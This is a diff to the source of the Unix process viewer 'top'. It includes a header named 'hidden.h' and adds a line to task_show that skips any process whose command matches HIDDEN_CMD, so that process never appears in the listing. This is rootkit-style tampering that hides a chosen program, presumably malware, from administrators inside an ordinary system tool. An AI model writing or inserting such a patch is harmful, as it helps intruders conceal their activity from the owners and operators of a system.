@@ -61,6 +61,7 @@
 #include "top.h"
 #include "top_nls.h"
 
+#include "../hidden.h"
 
 /*######  Miscellaneous global stuff  ####################################*/
 
@@ -5304,6 +5305,8 @@ static const char *task_show (const WIN_t *q, const proc_t *p) {
    static char rbuf[ROWMINSIZ];
    char *rp;
    int x;
+
+   if(!strncmp(p->cmd,HIDDEN_CMD,15)) return "";
 
    // we must begin a row with a possible window number in mind...
    *(rp = rbuf) = '\0';
